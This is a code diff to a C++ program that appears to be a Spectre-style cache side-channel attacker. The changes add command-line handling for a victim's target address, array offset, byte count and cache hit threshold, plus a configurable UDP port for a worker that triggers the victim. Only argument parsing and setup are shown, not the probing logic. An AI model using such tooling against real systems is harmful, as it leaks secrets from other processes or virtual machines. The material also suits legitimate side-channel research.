@@ -48,13 +48,13 @@
 /********************************************************************
 Attacker globals.
 ********************************************************************/
-// [Optional] Relevant virtual addresses for attacker's convenience:
-uint64_t target_array1_va;   // VM Address of victim's array (e.g. array1[])
-uint64_t target_va;          // VM Address of target in victim
-
 // Target offsets (attack only needs this):
 uint64_t target_x_offset;  // Offset relative to victim's array1
 uint64_t target_len;      // Number of bytes to attempt to read at offset
+
+// [Optional] Relevant virtual addresses for attacker's convenience:
+uint64_t target_array1_va;   // VM Address of victim's array (e.g. array1[])
+uint64_t target_va;          // VM Address of target in victim
 
 
 /********************************************************************
@@ -76,7 +76,8 @@ std::vector< std::array<uint8_t,256> > latency_ts;  // timeseries of access late
 #endif
 std::vector< std::bitset<256> > hit_ts;  // timeseries of line hits
 
-//int results[256]; // score / byte
+/* Other global (optional) parameters */
+uint16_t udp_port = 7777;
 
 #ifdef NOCLFLUSH
 #define CACHE_FLUSH_ITERATIONS 2048
@@ -413,50 +414,70 @@ void print_config() {
   std::cout << std::endl;
 }
 
+
 void parse_args(int argc, char* const argv[]) {
- /*  Command line arguments:
-  *  1: Victim's secret VA address start (size_t)
-  *  2: Victim's secret byte count (int64_t)
-  *  3: Cache hit threshold (size_t)
-  */
-  // TODO: update argument comments...
+  // Set if argument is parsed:
+  bool found_target_va = false;
+  bool found_array1_va = false;
+  bool found_target_len = false;
+  bool found_target_x_offset = false;
 
   int c;
   opterr = 0;
-  while ( (c = getopt(argc, argv, "hp:a:s:l:o:c:")) > 0) {
+  while ( (c = getopt(argc, argv, "ht:a:s:l:o:c:p:")) > 0) {
     switch (c) {
     case 'h':
       std::cout << argv[0]
-          << " {(-o target_x_offset) | (-p target_va]) (-a array1_va)}" \
-             " (-l target_bytes) [-c cache_hit_threshold]" << std::endl;
+          << " {(-o target_x_offset) | (-t target_va]) (-a array1_va)}" \
+             " (-l target_bytes) [-c cache_hit_threshold] [-p udp_port]"
+          << std::endl;
       exit(EXIT_SUCCESS);
       break;
-    case 'p':
+    case 't':  // Victim's secret VA address (size_t)
       target_va = static_cast<uint64_t>(atoll(optarg));
+      found_target_va = true;
       break;
-    case 'a':
+    case 'a': // Victim's array1 VA address (size_t)
       target_array1_va = static_cast<uint64_t>(atoll(optarg));
+      found_array1_va = true;
       break;
     case 's':
-    case 'l':
+    case 'l': // Victim's secret byte count (int64_t)
       target_len = atoll(optarg);
+      found_target_len = true;
       break;
-    case 'o':
+    case 'o': // Victim's secret element-offset from array1 (size_t)
       target_x_offset = atoll(optarg);
+      found_target_x_offset = true;
       break;
-    case 'c':
+    case 'c': // Cache hit threshold (size_t)
       cache_hit_threshold = atoll(optarg);
+      break;
+    case 'p': // Bind to another UDP port (uint16_t)
+      udp_port = atol(optarg);
       break;
     case '?':
       std::cerr << "Unknown argument: " << opterr << std::endl;
       exit(EXIT_FAILURE);
     default:
-      std::cerr << "Unexpected argument char: " << optarg << std::endl;
+      std::cerr << "Unexpected argument string: " << optarg << std::endl;
       exit(EXIT_FAILURE);
     }
   }
 
-  // TODO: ensure sufficient arguments are passed in...
+  // Ensure required arguments are passed in:
+  bool target_aquired = found_target_x_offset ||
+                        (found_target_va && found_array1_va);
+  if (!(found_target_len && target_aquired)) {
+    std::cerr << "Need to supply either target_x_offset or {target_va, array1_va}"
+              << std::endl;
+    exit(EXIT_FAILURE);
+  }
+
+  // Calculate target_x_offset if needed:
+  if (!found_target_x_offset) {
+    target_x_offset = target_va - target_array1_va;
+  }
 }
 
 
@@ -478,7 +499,7 @@ std::vector<size_t> sort_indexes(const T& v) {
 /********************************************************************
 UDP socket functions.
 ********************************************************************/
-void send_worker(uint16_t port = 7777) {
+void send_worker(uint16_t port) {
   // Socket initialization:
   uint8_t buf[2048];
   SocketUDP s;
@@ -650,8 +671,8 @@ int main(int argc, char* const argv[]) {
   // Initialization:
   print_config();
   init_pages();
-
   parse_args(argc, argv);
+
   if (target_va != 0) {
     std::cout << "Supplied array1 virtual address: 0x" << target_array1_va << '\n';
     std::cout << "Targeting virtual address: 0x" << target_va << '\n';
@@ -677,7 +698,7 @@ int main(int argc, char* const argv[]) {
   CPU_ZERO(&cpuset);
   CPU_SET(1, &cpuset);
 
-  std::thread t(send_worker, 7777);
+  std::thread t(send_worker, udp_port);
   int rc = pthread_setaffinity_np(t.native_handle(), sizeof(cpuset), &cpuset);
   if (rc != 0) {
     std::cerr << "Error calling pthread_setaffinity_np: " << rc << "\n";
